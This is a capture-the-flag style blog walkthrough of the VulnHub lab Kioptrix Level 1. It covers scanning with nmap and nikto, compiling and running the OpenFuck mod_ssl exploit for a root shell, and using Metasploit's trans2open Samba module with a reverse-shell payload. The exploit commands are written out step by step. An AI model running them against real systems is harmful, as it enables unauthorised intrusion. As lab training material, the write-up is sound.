---
layout: post
title: "Kioptrix Level 1"
date: 2022-02-04
categories: [VulnHub, Easy-VulnHub]
tags: [boot2root]
image: ../../assets/img/posts/kioptrix.png 

---

## Description

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. 

|**Box**|[Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)|

---

We'll start with first discovering the IP address of the box using **netdiscover** tool,

```bash
sudo netdiscover -r 10.0.2.0/24
```

![image](https://user-images.githubusercontent.com/67465230/187385807-9e313937-e3a8-4c77-a170-55e4f2052b47.png)

Okay, so the IP address of the box is **10.0.2.21**.

Now, let's start port scanning with **nmap**,

```bash
sudo nmap -A -T4 -p- -oN nmap_scan 10.0.2.21
```

![image](https://user-images.githubusercontent.com/67465230/187385902-3b16cad0-ad9f-48fa-b21e-dfb8018aa589.png)
![image](https://user-images.githubusercontent.com/67465230/187385950-9e2bdf9f-2c4d-4b98-8a07-8968a4dea14c.png)

there are multiple open ports present. We'll enumerate them individually.

Since we know that this box is running a webserver which host a website, so we'll first see how many technologies are running on website with whatweb tool,

```bash
whatweb http://10.0.2.21
```

![image](https://user-images.githubusercontent.com/67465230/187386084-99cad932-8ba6-49ac-8e85-5cc6c5b3c89a.png)

this is running mod_ssl (exploit) impressive :0. Let's enumerate it more.

let's visit http://10.0.2.21,

![image](https://user-images.githubusercontent.com/67465230/187386141-3b904790-da4c-4c87-b3f0-d1443ce06a1e.png)

that's a simple apache installation text page. 

let's visit https://10.0.2.21 as well,

![image](https://user-images.githubusercontent.com/67465230/187386200-5880cbe9-601f-49f2-b06e-f59aaeee68d1.png)

we can see that this is a same page which we encountered before on port 80.

Let's run **nikto** tool to scan website for vulnerabilities,

```bash
nikto --host http://10.0.2.21
```

![image](https://user-images.githubusercontent.com/67465230/187386257-e817e76d-d93d-49e0-9340-fd29bb5a7030.png)

there are many things to look for but the thing which takes my attention is this website is vulnerable to **mod_ssl 2.8.4 exploit**.

![image](https://user-images.githubusercontent.com/67465230/187386300-749b8930-2efc-44b4-b0fc-a90feef0b92e.png)

We can take a look at this exploit code on https://www.exploit-db.com/exploits/764 and this exploit's name is OpenFuckV2. This **mod_ssl** vulnerability allows buffer overflow to gain remote shell.

Let's look at the how this exploit work and download this exploit from github https://github.com/heltonWernik/OpenLuck

![image](https://user-images.githubusercontent.com/67465230/187386376-45ae8bc8-2c9c-4985-bbab-18c882d5373a.png)

follow the steps in usage image from github to fireup the exploit,

```bash
git clone https://github.com/heltonWernik/OpenLuck.git
cd Openluck
sudo apt-get install libssl-dev
compiling exploit,
gcc -o OpenFuck OpenFuck.c -lcrypto
```

let's see how this exploit works,

```bash
./OpenFuck
```

![image](https://user-images.githubusercontent.com/67465230/187386682-d5c6b624-9ec2-483a-bb69-3522a51cc86e.png)

seems like we've to first we've to provide supported offset of the version running on the box.

we'll use RedHat linux 7.2 version offset 0x6b,

```bash
./OpenFuck 0x6b 10.0.2.21 443 -c 41
```

![image](https://user-images.githubusercontent.com/67465230/187386755-114aa3b8-4646-4dc5-8029-377e51cd7ba6.png)

we got ROOT!!!

**Note: This exploit might take 2-3 tries to get you a shell, so try hard ;).**

Let's take a look at another method on how we can gain root access to this box.

Let's fireup the metasploit framework using `msfconsole` and we'll look how to exploit this box.

we'll search for samba exploit modules in msfconsole,

```bash
search linux samba
```

![image](https://user-images.githubusercontent.com/67465230/187387539-8723acc4-7a15-44a6-9e89-4ddfccc52755.png)

okay, so we got trans2open exploit and we're going to use that to gain a system access.

```bash
use exploit/linux/samba/trans2open
```

![image](https://user-images.githubusercontent.com/67465230/187387575-e5e07760-7fc8-44d6-b717-eaaf1af8ea07.png)

we can see that our payload is automatically assigned as **generic/shell_reverse_tcp**, if not, then set it using `set payload generic/shell_reverse_tcp`.

now type `options` to show list of options we have in this module,

![image](https://user-images.githubusercontent.com/67465230/187387762-33f56bfa-5f7a-4ebc-b7b5-46e039c7ceb7.png)

here we'll set RHOSTS to our kioptrix box's IP. To set this ip, type `set rhosts 10.0.2.21` and then fireup the module using `exploit`,

![image](https://user-images.githubusercontent.com/67465230/187387819-4189b69a-0a73-453b-8e09-df14cceb07df.png)
![image](https://user-images.githubusercontent.com/67465230/187387872-4e4d4b3f-abf2-410c-a82b-7a445e5e3366.png)

we got system shell!!

**Note: After firing up this exploit, it might take some time get root shell. Have patience and if it doesn't work then try again.**

We saw both methods, i.e. Manual method by using OpenFuckV2 exploit and Automated Method using Metasploit Framework to exploit this box.